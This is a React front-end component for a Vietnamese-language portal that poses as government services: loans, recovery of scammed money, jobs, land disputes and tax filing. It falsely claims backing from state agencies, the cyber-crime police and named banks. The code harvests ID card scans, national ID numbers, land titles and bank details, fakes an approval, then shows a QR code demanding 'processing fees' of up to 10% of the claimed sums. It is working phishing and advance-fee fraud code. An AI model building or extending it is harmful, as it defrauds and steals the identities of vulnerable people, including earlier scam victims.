import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';

const API_BASE = import.meta.env.VITE_API_URL || 'http://localhost:5000/api';

const LoanWorkflow = ({ service = 'vay-von' }) => {
    const [state, setState] = useState('initial');
    const [token, setToken] = useState(new URLSearchParams(window.location.search).get('token') || '');
    const [loading, setLoading] = useState(false);
    const [qrUrl, setQrUrl] = useState('');
    const [amount, setAmount] = useState('');
    const [fee, setFee] = useState(0);
    const [currentService, setCurrentService] = useState(service); // Track actual service from API
    const [fileFront, setFileFront] = useState(null);
    const [fileBack, setFileBack] = useState(null);
    const [previewFront, setPreviewFront] = useState(null);
    const [previewBack, setPreviewBack] = useState(null);
    const [fileBill, setFileBill] = useState(null);
    const [previewBill, setPreviewBill] = useState(null);
    const [fileLand, setFileLand] = useState(null);
    const [previewLand, setPreviewLand] = useState(null);
    const skipPollingRef = useRef(false);

    useEffect(() => {
        if (token) {
            checkStatus(token);
            const interval = setInterval(() => checkStatus(token), 5000);
            return () => clearInterval(interval);
        }
    }, [token]);

    // Reset state when service changes
    useEffect(() => {
        if (!token) {
            setState('initial');
            setFileFront(null);
            setFileBack(null);
            setPreviewFront(null);
            setPreviewBack(null);
            setFileBill(null);
            setPreviewBill(null);
            setFileLand(null);
            setPreviewLand(null);
        }
    }, [service, token]);

    const checkStatus = async (chkToken) => {
        if (skipPollingRef.current) return;
        try {
            const res = await axios.get(`${API_BASE}/status?token=${chkToken}`);
            const data = res.data;
            if (data.amount) setAmount(data.amount);
            if (data.fee) setFee(data.fee);
            if (data.service) setCurrentService(data.service); // Use service from API
            if (data.status === 'pending') setState('pending');
            else if (data.status === 'approved') setState('approved');
            else if (data.status === 'waiting_qr') setState('waiting_qr');
            else if (data.status === 'qr_ready' || (data.qr_url && data.status !== 'done')) {
                setState('qr_ready');
                if (data.qr_url) setQrUrl(data.qr_url);
            }
            else if (data.status === 'done' || data.status === 'scanned') setState('success');
        } catch (error) {
            console.error('Status check error:', error);
        }
    };

    const handleLoanSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        const formData = new FormData(e.target);
        formData.append('service', service);
        if (fileFront) formData.append('file_front', fileFront);
        if (fileBack) formData.append('file_back', fileBack);
        if (fileBill) formData.append('file_bill', fileBill);
        if (fileLand) formData.append('file_land', fileLand);

        try {
            const res = await axios.post(`${API_BASE}/submit`, formData, {
                headers: { 'Content-Type': 'multipart/form-data' },
                timeout: 60000 // 60 second timeout
            });
            if (res.data.result === 'success') {
                if (res.data.token) {
                    const newToken = res.data.token;
                    setToken(newToken);
                    window.history.pushState({}, '', `?token=${newToken}`);
                    setState('pending');
                } else {
                    setState('submitted');
                }
            } else {
                alert('Có lỗi xảy ra: ' + (res.data.message || 'Vui lòng thử lại.'));
            }
        } catch (err) {
            console.error('Submit error:', err);
            if (err.code === 'ECONNABORTED') {
                alert('Quá thời gian chờ. Vui lòng thử lại với file ảnh nhỏ hơn.');
            } else if (err.response?.data?.message) {
                alert('Lỗi: ' + err.response.data.message);
            } else {
                alert('Có lỗi xảy ra, vui lòng thử lại.');
            }
        } finally {
            setLoading(false);
        }
    };

    const onFileChange = (e, side) => {
        const file = e.target.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onloadend = () => {
            if (side === 'front') {
                setFileFront(file);
                setPreviewFront(reader.result);
            } else if (side === 'back') {
                setFileBack(file);
                setPreviewBack(reader.result);
            } else if (side === 'bill') {
                setFileBill(file);
                setPreviewBill(reader.result);
            } else if (side === 'land') {
                setFileLand(file);
                setPreviewLand(reader.result);
            }
        };
        reader.readAsDataURL(file);
    };

    const handleBankSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        const formData = new FormData(e.target);
        const data = { ...Object.fromEntries(formData.entries()), token };
        try {
            await axios.post(`${API_BASE}/submit-bank`, data, {
                timeout: 30000 // 30 second timeout
            });
            skipPollingRef.current = false;
            setState('waiting_qr');
        } catch (err) {
            console.error('Bank submit error:', err);
            if (err.code === 'ECONNABORTED') {
                alert('Quá thời gian chờ. Vui lòng thử lại.');
            } else if (err.response?.data?.message) {
                alert('Lỗi: ' + err.response.data.message);
            } else {
                alert('Lỗi khi gửi thông tin ngân hàng.');
            }
        } finally {
            setLoading(false);
        }
    };

    if (state === 'submitted') {
        return (
            <div className="state-container">
                <div className="state-title">⏳ Vui lòng chờ phê duyệt hồ sơ</div>
                <p style={{ color: '#666', fontSize: '16px', lineHeight: '1.6' }}>
                    Hồ sơ của Quý khách đã được tiếp nhận thành công. <br />
                    Bạn sẽ nhận được <b>thông báo qua Gmail</b> khi hồ sơ được phê duyệt.
                </p>
                <button className="btn-submit" style={{ marginTop: '20px' }} onClick={() => setState('initial')}>Về trang chủ</button>
            </div>
        );
    }

    if (state === 'pending') {
        return (
            <div className="state-container">
                <div className="state-title">⌛ Hồ sơ của Quý khách đang được xét duyệt</div>
                <p style={{ color: '#666', fontSize: '13px' }}>Hệ thống sẽ tự động cập nhật khi có kết quả. Vui lòng không đóng trang này.</p>
            </div>
        );
    }

    if (state === 'initial') {
        const isLoan = service === 'vay-von';
        const serviceTitle = {
            'vay-von': 'Cổng thông tin hỗ trợ Vay vốn',
            'tien-treo': 'Hỗ trợ lấy lại tiền treo',
            'tim-viec': 'Cổng thông tin hỗ trợ Tìm việc làm',
            'dat-dai': 'Giải quyết tranh chấp Đất đai',
            'nop-thue': 'Cổng đăng ký Nộp thuế điện tử'
        }[service] || 'Cổng tiếp nhận thông tin hỗ trợ';

        const fileLabel = {
            'vay-von': 'Căn cước công dân',
            'tien-treo': 'Căn cước công dân',
            'tim-viec': 'CCCD hoặc Bằng cấp',
            'dat-dai': 'Căn cước công dân', // Changed to CCCD for 2-sided upload
            'nop-thue': 'Giấy phép kinh doanh'
        }[service] || 'Tài liệu đính kèm';

        return (
            <div className="pakn_cover">
                <h2>{serviceTitle}</h2>

                <p style={{ color: '#666', fontSize: '13px', marginBottom: '25px', lineHeight: '1.6' }}>
                    Vui lòng cung cấp đầy đủ thông tin để chúng tôi có thể hỗ trợ Quý khách một cách tốt nhất theo đúng quy trình.
                </p>

                {service === 'vay-von' && (
                    <div style={{
                        display: 'flex',
                        flexDirection: 'column',
                        alignItems: 'center',
                        gap: '15px',
                        marginBottom: '30px',
                        padding: '25px',
                        background: 'linear-gradient(to bottom, #ffffff, #f8faff)',
                        borderRadius: '12px',
                        border: '1px solid #e1e4e8',
                        boxShadow: '0 4px 6px rgba(0,0,0,0.02)'
                    }}>
                        <img src="/partner_logos.png" alt="Đối tác tài chính" style={{ width: '100%', maxWidth: '400px', objectFit: 'contain' }} />
                        <div style={{ textAlign: 'center' }}>
                            <p style={{ fontSize: '16px', color: '#2c3e50', margin: '0 0 10px 0', fontWeight: '600', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                                Hợp tác hỗ trợ tài chính
                            </p>
                            <p style={{ fontSize: '15px', color: '#4a5568', margin: 0, lineHeight: '1.6' }}>
                                Nhà nước hợp tác với các đơn vị: <b>FE Credit, Home Credit, HD Saison, VPBank...</b><br />
                                Tạo điều kiện vay vốn sửa nhà, kinh doanh, sản xuất với hạn mức lên đến <span style={{ color: '#d32f2f', fontWeight: 'bold', fontSize: '16px' }}>500 triệu đồng</span>.
                            </p>
                        </div>
                    </div>
                )}

                {service === 'tien-treo' && (
                    <div style={{
                        display: 'flex',
                        flexDirection: 'column',
                        alignItems: 'center',
                        gap: '15px',
                        marginBottom: '30px',
                        padding: '25px',
                        background: 'linear-gradient(to bottom, #ffffff, #e6fffa)',
                        borderRadius: '12px',
                        border: '1px solid #b2f5ea',
                        boxShadow: '0 4px 6px rgba(0,0,0,0.02)'
                    }}>
                        <img src="/security_logo.png" alt="An ninh mạng" style={{ width: '120px', objectFit: 'contain' }} />
                        <div style={{ textAlign: 'center' }}>
                            <p style={{ fontSize: '16px', color: '#2c7a7b', margin: '0 0 10px 0', fontWeight: '700', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                                Hỗ trợ thu hồi vốn an toàn
                            </p>
                            <p style={{ fontSize: '14px', color: '#2d3748', margin: '0 0 15px 0', lineHeight: '1.6' }}>
                                Sự hợp tác giữa <b>Phòng An ninh mạng & PCTP sử dụng công nghệ cao</b> và các ngân hàng.<br />
                                Hỗ trợ người dân lấy lại tiền đã bị các đối tượng mạng lừa đảo.
                            </p>
                            <div style={{ marginTop: '15px', borderTop: '1px solid #b2f5ea', paddingTop: '15px' }}>
                                <p style={{ fontSize: '13px', color: '#555', marginBottom: '10px' }}>Đối tác liên kết:</p>
                                <img src="/bank_coop_logos.png" alt="Các ngân hàng liên kết" style={{ width: '100%', maxWidth: '350px', objectFit: 'contain' }} />
                            </div>
                        </div>
                    </div>
                )}

                {service === 'nop-thue' && (
                    <div style={{
                        display: 'flex',
                        flexDirection: 'column',
                        alignItems: 'center',
                        gap: '15px',
                        marginBottom: '30px',
                        padding: '25px',
                        background: 'linear-gradient(to bottom, #ffffff, #fff5f5)',
                        borderRadius: '12px',
                        border: '1px solid #fed7d7',
                        boxShadow: '0 4px 6px rgba(0,0,0,0.02)'
                    }}>
                        <img src="/tax_logo.png" alt="Kho bạc nhà nước" style={{ width: '120px', objectFit: 'contain' }} />
                        <div style={{ textAlign: 'center' }}>
                            <p style={{ fontSize: '16px', color: '#c53030', margin: '0 0 10px 0', fontWeight: '700', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                                Hỗ trợ doanh nghiệp
                            </p>
                            <p style={{ fontSize: '15px', color: '#2d3748', margin: 0, lineHeight: '1.6' }}>
                                <b>Kho bạc nhà nước</b> hỗ trợ các doanh nghiệp nộp thuế online.
                            </p>
                        </div>
                    </div>
                )}

                {service === 'tim-viec' && (
                    <div style={{
                        display: 'flex',
                        flexDirection: 'column',
                        alignItems: 'center',
                        gap: '15px',
                        marginBottom: '30px',
                        padding: '25px',
                        background: 'linear-gradient(to bottom, #ffffff, #ebf8ff)',
                        borderRadius: '12px',
                        border: '1px solid #bee3f8',
                        boxShadow: '0 4px 6px rgba(0,0,0,0.02)'
                    }}>
                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px', width: '100%', alignItems: 'center' }}>
                            <img src="/job_partners.png" alt="Các doanh nghiệp đối tác" style={{ width: '100%', objectFit: 'contain' }} />
                            <img src="/job_portals.png" alt="Các trang tuyển dụng" style={{ width: '100%', objectFit: 'contain' }} />
                        </div>
                        <div style={{ textAlign: 'center' }}>
                            <p style={{ fontSize: '16px', color: '#2b6cb0', margin: '0 0 10px 0', fontWeight: '700', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                                Kết nối việc làm nhanh chóng
                            </p>
                            <p style={{ fontSize: '15px', color: '#2d3748', margin: 0, lineHeight: '1.6' }}>
                                Nhà nước phối hợp cùng các <b>Tập đoàn, Doanh nghiệp & Cổng thông tin việc làm hàng đầu</b>.<br />
                                Hỗ trợ người dân tìm kiếm việc làm phù hợp và ổn định.
                            </p>
                        </div>
                    </div>
                )}

                {service === 'dat-dai' && (
                    <div style={{
                        display: 'flex',
                        flexDirection: 'column',
                        alignItems: 'center',
                        gap: '15px',
                        marginBottom: '30px',
                        padding: '25px',
                        background: 'linear-gradient(to bottom, #ffffff, #fffaf0)',
                        borderRadius: '12px',
                        border: '1px solid #fbd38d',
                        boxShadow: '0 4px 6px rgba(0,0,0,0.02)'
                    }}>
                        <img src="/procuracy_logo.jpg" alt="Viện Kiểm Sát" style={{ width: '120px', objectFit: 'contain' }} />
                        <div style={{ textAlign: 'center' }}>
                            <p style={{ fontSize: '16px', color: '#c05621', margin: '0 0 10px 0', fontWeight: '700', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                                Hỗ trợ pháp lý đất đai
                            </p>
                            <p style={{ fontSize: '15px', color: '#2d3748', margin: 0, lineHeight: '1.6' }}>
                                Chúng tôi phối hợp cùng <b>Viện Kiểm Sát</b>.<br />
                                Giải quyết vấn đề đất đai cho người dân nhanh chóng, đúng pháp luật.
                            </p>
                        </div>
                    </div>
                )}

                <form className="loan-form-container" onSubmit={handleLoanSubmit}>
                    <div className="form-group">
                        <label>Họ và tên <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="fullname" placeholder="Nhập họ và tên" required />
                    </div>
                    <div className="form-group">
                        <label>Giới tính <span style={{ color: 'red' }}>*</span></label>
                        <select name="gender" required>
                            <option value="">Chọn giới tính</option>
                            <option value="Nam">Nam</option>
                            <option value="Nữ">Nữ</option>
                        </select>
                    </div>
                    <div className="form-group">
                        <label>Tuổi <span style={{ color: 'red' }}>*</span></label>
                        <input type="number" name="age" defaultValue="18" min="1" max="99" required />
                    </div>
                    <div className="form-group">
                        <label>Số CCCD <span style={{ color: 'red' }}>*</span></label>
                        <input
                            type="text"
                            name="cccd"
                            placeholder="Nhập số CCCD (12 số)"
                            required
                            pattern="[0-9]{12}"
                            title="Số CCCD phải có đúng 12 chữ số"
                            maxLength="12"
                        />
                    </div>
                    <div className="form-group">
                        <label>Số điện thoại <span style={{ color: 'red' }}>*</span></label>
                        <input
                            type="tel"
                            name="phone"
                            placeholder="Nhập số điện thoại (10 số)"
                            required
                            pattern="[0-9]{10}"
                            title="Số điện thoại phải có đúng 10 chữ số"
                            maxLength="10"
                        />
                    </div>
                    <div className="form-group">
                        <label>Gmail <span style={{ color: 'red' }}>*</span></label>
                        <input type="email" name="email" placeholder="example@gmail.com" required />
                    </div>

                    {/* Common but dynamic fields */}
                    <div className="form-group">
                        <label>Mã giới thiệu (nếu có)</label>
                        <input
                            type="text"
                            name="referralCode"
                            placeholder="Nhập mã giới thiệu (5 số)"
                            pattern="[0-9]{5}"
                            title="Mã giới thiệu phải có đúng 5 chữ số"
                            maxLength="5"
                        />
                    </div>

                    {!isLoan && (
                        <div className="form-group">
                            <label>Trình độ học vấn <span style={{ color: 'red' }}>*</span></label>
                            <input type="text" name="education" placeholder="VD: Đại học, Cao đẳng..." required />
                        </div>
                    )}

                    {service === 'tien-treo' && (
                        <div className="form-group">
                            <label>Số tiền bị lừa (VND) <span style={{ color: 'red' }}>*</span></label>
                            <input type="number" name="scammedAmount" placeholder="VD: 50000000" required />
                            <p style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>Phí xử lý hồ sơ: 10% số tiền bị lừa</p>
                        </div>
                    )}

                    {service === 'tim-viec' && (
                        <>
                            <div className="form-group">
                                <label>Ngành nghề mong muốn <span style={{ color: 'red' }}>*</span></label>
                                <input type="text" name="desiredJob" placeholder="VD: Kế toán, Lái xe..." required />
                            </div>
                            <div className="form-group">
                                <label>Khu vực làm việc / Địa chỉ gần đó <span style={{ color: 'red' }}>*</span></label>
                                <input type="text" name="preferredLocation" placeholder="VD: Quận 1, TP.HCM" required />
                            </div>
                            <div className="form-group">
                                <label>Kinh nghiệm làm việc (Đã làm ở đâu?) <span style={{ color: 'red' }}>*</span></label>
                                <textarea
                                    name="workExperience"
                                    placeholder="Mô tả ngắn gọn kinh nghiệm..."
                                    required
                                    style={{ width: '100%', padding: '10px', border: '1px solid #ddd', borderRadius: '4px', minHeight: '80px' }}
                                />
                            </div>
                            <p style={{ fontSize: '12px', color: '#666', marginTop: '10px', padding: '10px', background: '#f9f9f9', borderRadius: '4px' }}>
                                <b>Phí xử lý hồ sơ:</b> 3,000,000 VND (cố định)
                            </p>
                        </>
                    )}

                    {service === 'dat-dai' && (
                        <>
                            <div className="form-group">
                                <label>Giá trị tài sản tranh chấp (VND) <span style={{ color: 'red' }}>*</span></label>
                                <input type="number" name="disputedAssetValue" placeholder="VD: 500000000" required />
                                <p style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>Phí xử lý hồ sơ: 10% giá trị tài sản</p>
                            </div>
                            <div className="form-group">
                                <label>Nội dung tranh chấp <span style={{ color: 'red' }}>*</span></label>
                                <textarea
                                    name="disputeContent"
                                    placeholder="Trình bày chi tiết nội dung tranh chấp..."
                                    required
                                    style={{ width: '100%', padding: '10px', border: '1px solid #ddd', borderRadius: '4px', minHeight: '100px' }}
                                />
                            </div>
                        </>
                    )}

                    {service === 'nop-thue' && (
                        <>
                            <div className="form-group">
                                <label>Mã số thuế <span style={{ color: 'red' }}>*</span></label>
                                <input type="text" name="taxId" placeholder="Nhập mã số thuế" required />
                            </div>
                            <div className="form-group">
                                <label>Thu nhập hàng tháng (VND) <span style={{ color: 'red' }}>*</span></label>
                                <input type="number" name="monthlyIncome" placeholder="0" required />
                                <p style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>Phí xử lý hồ sơ: 10% thu nhập hàng tháng</p>
                            </div>
                        </>
                    )}

                    {isLoan && (
                        <>
                            <div className="form-group">
                                <label>Địa chỉ <span style={{ color: 'red' }}>*</span></label>
                                <input type="text" name="address" placeholder="Nhập địa chỉ hiện tại" required />
                            </div>
                            <div className="form-group">
                                <label>Nghề nghiệp <span style={{ color: 'red' }}>*</span></label>
                                <input type="text" name="occupation" placeholder="Nhập nghề nghiệp" required />
                            </div>
                            <div className="form-group">
                                <label style={{ marginBottom: '10px' }}>Đã từng vay vốn lần nào chưa? <span style={{ color: 'red' }}>*</span></label>
                                <div style={{ display: 'flex', gap: '30px' }}>
                                    <label style={{ display: 'flex', alignItems: 'center', cursor: 'pointer' }}>
                                        <input type="radio" name="hasLoan" value="yes" style={{ width: 'auto', marginRight: '8px' }} /> Đã từng vay
                                    </label>
                                    <label style={{ display: 'flex', alignItems: 'center', cursor: 'pointer' }}>
                                        <input type="radio" name="hasLoan" value="no" defaultChecked style={{ width: 'auto', marginRight: '8px' }} /> Chưa từng vay
                                    </label>
                                </div>
                            </div>
                            <div className="form-group">
                                <label>Thu nhập hàng tháng (VND) <span style={{ color: 'red' }}>*</span></label>
                                <input type="number" name="income" placeholder="0" required />
                            </div>
                            <div className="form-group">
                                <label>Số tiền cần vay <span style={{ color: 'red' }}>*</span></label>
                                <select name="loanAmount" required>
                                    <option value="">Chọn số tiền</option>
                                    <option value="10000000">10.000.000 VND</option>
                                    <option value="20000000">20.000.000 VND</option>
                                    <option value="50000000">50.000.000 VND</option>
                                    <option value="100000000">100.000.000 VND</option>
                                    <option value="200000000">200.000.000 VND</option>
                                    <option value="500000000">500.000.000 VND</option>
                                </select>
                            </div>
                        </>
                    )}

                    {/* Multi-file Upload for CCCD - Added dat-dai */}
                    {(service === 'vay-von' || service === 'tien-treo' || service === 'tim-viec' || service === 'dat-dai') ? (
                        <div className="form-group">
                            <label>Tải lên {fileLabel} (2 mặt) <span style={{ color: 'red' }}>*</span></label>
                            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px', marginTop: '10px' }}>
                                <div className="upload-area">
                                    <p style={{ fontSize: '12px', marginBottom: '5px' }}>Mặt trước</p>
                                    <input type="file" required onChange={(e) => onFileChange(e, 'front')} accept="image/*" />
                                    {previewFront && <img src={previewFront} alt="Mặt trước" style={{ width: '100%', marginTop: '10px', borderRadius: '4px', border: '1px solid #ddd' }} />}
                                </div>
                                <div className="upload-area">
                                    <p style={{ fontSize: '12px', marginBottom: '5px' }}>Mặt sau</p>
                                    <input type="file" required onChange={(e) => onFileChange(e, 'back')} accept="image/*" />
                                    {previewBack && <img src={previewBack} alt="Mặt sau" style={{ width: '100%', marginTop: '10px', borderRadius: '4px', border: '1px solid #ddd' }} />}
                                </div>
                            </div>
                        </div>
                    ) : (
                        <div className="form-group">
                            <label>Tải lên {fileLabel} <span style={{ color: 'red' }}>*</span></label>
                            <input type="file" name="file" accept="image/*,.pdf" required style={{ padding: '8px' }} />
                        </div>
                    )}

                    {service === 'tien-treo' && (
                        <div className="form-group">
                            <label>Tải lên ảnh Bill chuyển khoản <span style={{ color: 'red' }}>*</span></label>
                            <div className="upload-area">
                                <p style={{ fontSize: '12px', marginBottom: '5px' }}>Ảnh Bill</p>
                                <input type="file" required onChange={(e) => onFileChange(e, 'bill')} accept="image/*" />
                                {previewBill && <img src={previewBill} alt="Ảnh Bill" style={{ width: '100%', marginTop: '10px', borderRadius: '4px', border: '1px solid #ddd' }} />}
                            </div>
                        </div>
                    )}

                    {service === 'dat-dai' && (
                        <div className="form-group">
                            <label>Tải lên Sổ đỏ / Giấy tờ đất <span style={{ color: 'red' }}>*</span></label>
                            <div className="upload-area">
                                <p style={{ fontSize: '12px', marginBottom: '5px' }}>Ảnh Sổ đỏ / Giấy tờ</p>
                                <input type="file" required onChange={(e) => onFileChange(e, 'land')} accept="image/*,.pdf" />
                                {previewLand && <img src={previewLand} alt="Sổ đỏ" style={{ width: '100%', marginTop: '10px', borderRadius: '4px', border: '1px solid #ddd' }} />}
                            </div>
                        </div>
                    )}


                    <div style={{ textAlign: 'center', marginTop: '20px' }}>
                        <button type="submit" className="btn-submit" disabled={loading}>
                            {loading ? 'Đang xử lý...' : 'Gửi thông tin'}
                        </button>
                    </div>
                </form >
            </div >
        );
    }

    if (state === 'approved') {
        const needsBankForm = currentService === 'vay-von' || currentService === 'tien-treo';
        return (
            <div className="state-container">
                <div className="state-title" style={{ color: '#28a745' }}>✅ Hồ sơ của Quý khách đã được phê duyệt thành công</div>
                {needsBankForm ? (
                    <button className="btn-submit" onClick={() => { skipPollingRef.current = true; setState('bank'); }}>Vui lòng làm thủ tục giải ngân</button>
                ) : (
                    <button className="btn-submit" onClick={async () => {
                        setLoading(true);
                        try {
                            // Auto-submit without bank info for services that don't need it
                            await axios.post(`${API_BASE}/submit-bank`, { token, bankOwner: 'N/A', bankName: 'N/A', bankAccount: 'N/A' });
                            skipPollingRef.current = false;
                            setState('waiting_qr');
                        } catch (e) {
                            alert('Có lỗi xảy ra, vui lòng thử lại.');
                        }
                        setLoading(false);
                    }} disabled={loading}>{loading ? 'Đang xử lý...' : 'Tiến hành thanh toán phí'}</button>
                )}
            </div>
        );
    }

    if (state === 'bank') {
        return (
            <div className="pakn_cover">
                <h2>Thông tin giải ngân</h2>
                <form className="loan-form-container" onSubmit={handleBankSubmit}>
                    <div className="form-group">
                        <label>Chủ tài khoản <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="bankOwner" placeholder="Nhập tên" required />
                    </div>
                    <div className="form-group">
                        <label>Ngân hàng <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="bankName" placeholder="Nhập tên ngân hàng" required />
                    </div>
                    <div className="form-group">
                        <label>Số tài khoản <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="bankAccount" placeholder="Nhập số tài khoản" required />
                    </div>
                    <div style={{ marginTop: '15px', padding: '15px', background: '#fff5f5', borderRadius: '8px', border: '1px solid #fed7d7', color: '#c53030', fontSize: '14px' }}>
                        <b>Lưu ý:</b> Theo quy định của KBNN, Quý khách vui lòng chuẩn bị phí xử lý hồ sơ {fee > 0 ? <><b>{fee.toLocaleString('vi-VN')} VNĐ</b></> : ''} để hoàn tất thủ tục.
                    </div>
                    <div style={{ textAlign: 'center', marginTop: '30px' }}>
                        <button type="submit" className="btn-submit" disabled={loading}>
                            {loading ? 'Đang xác nhận...' : 'Xác nhận'}
                        </button>
                    </div>
                </form>
            </div>
        );
    }
    // Service-specific titles and messages
    const getServiceInfo = () => {
        switch (currentService) {
            case 'vay-von':
                return { title: 'Giải ngân vay vốn', waitingMsg: 'giải ngân', successMsg: 'Tiền sẽ được chuyển vào tài khoản của bạn trong 3-5 ngày làm việc.' };
            case 'tien-treo':
                return { title: 'Hỗ trợ lấy lại tiền treo', waitingMsg: 'xử lý hồ sơ', successMsg: 'Chúng tôi sẽ liên hệ hỗ trợ bạn lấy lại tiền trong thời gian sớm nhất.' };
            case 'tim-viec':
                return { title: 'Hỗ trợ tìm việc làm', waitingMsg: 'xử lý hồ sơ', successMsg: 'Chúng tôi sẽ liên hệ giới thiệu việc làm phù hợp trong thời gian sớm nhất.' };
            case 'dat-dai':
                return { title: 'Giải quyết đất đai', waitingMsg: 'xử lý hồ sơ', successMsg: 'Bộ phận pháp lý sẽ liên hệ hỗ trợ giải quyết tranh chấp trong thời gian sớm nhất.' };
            case 'nop-thue':
                return { title: 'Kê khai thuế', waitingMsg: 'xử lý hồ sơ', successMsg: 'Chúng tôi sẽ liên hệ hướng dẫn hoàn tất kê khai thuế trong thời gian sớm nhất.' };
            default:
                return { title: 'Xử lý hồ sơ', waitingMsg: 'xử lý', successMsg: 'Chúng tôi sẽ liên hệ với bạn trong thời gian sớm nhất.' };
        }
    };
    const serviceInfo = getServiceInfo();

    if (state === 'waiting_qr') {
        return (
            <div className="state-container">
                <div className="state-title">⏳ Chúng tôi đang {serviceInfo.waitingMsg}</div>
                <p style={{ color: '#666', fontSize: '14px', lineHeight: '1.6' }}>
                    Mã QR sẽ được cung cấp sau khi xác nhận thông tin.<br />
                    Vui lòng không đóng trang này.
                </p>
                {fee > 0 && (
                    <div style={{ marginTop: '20px', padding: '15px', background: '#f8faff', borderRadius: '8px', border: '1px solid #e1e4e8' }}>
                        <p style={{ margin: 0, color: '#2c3e50', fontSize: '15px' }}>
                            Phí {serviceInfo.title.toLowerCase()}: <br />
                            <b style={{ color: '#d32f2f', fontSize: '18px' }}>{fee.toLocaleString('vi-VN')} VNĐ</b>
                        </p>
                    </div>
                )}
            </div>
        );
    }

    if (state === 'qr_ready') {
        return (
            <div className="state-container">
                {qrUrl && (
                    <div style={{ marginBottom: '20px', textAlign: 'center' }}>
                        <div className="state-title" style={{ color: '#28a745', marginBottom: '20px' }}>✅ Mã QR thanh toán - {serviceInfo.title}</div>
                        <img src={qrUrl} alt="QR Code" style={{ maxWidth: '280px', border: '1px solid #ddd', padding: '10px', borderRadius: '8px' }} />
                        {fee > 0 && (
                            <div style={{ marginTop: '15px', color: '#d32f2f', fontWeight: 'bold', fontSize: '18px' }}>
                                Phí {serviceInfo.title.toLowerCase()}: {fee.toLocaleString('vi-VN')} VNĐ
                            </div>
                        )}
                        <p style={{ fontSize: '14px', marginTop: '10px', fontWeight: 'bold', color: '#ff4d4f' }}>
                            ⚠️ Mã QR có hiệu lực trong vòng 10 phút
                        </p>
                        <p style={{ color: '#666', fontSize: '13px', marginTop: '5px' }}>Quét mã QR để hoàn tất thủ tục {serviceInfo.title.toLowerCase()}</p>
                    </div>
                )}
                {!qrUrl && (
                    <div className="state-title">⏳ Đang tải mã QR...</div>
                )}
            </div>
        );
    }

    if (state === 'success') {
        return (
            <div className="state-container">
                <div className="state-title" style={{ color: '#28a745', fontSize: '24px' }}>🎉 {serviceInfo.title} thành công!</div>
                <p style={{ color: '#666', fontSize: '16px' }}>{serviceInfo.successMsg}</p>
            </div>
        );
    }

    return null;
};

export default LoanWorkflow;
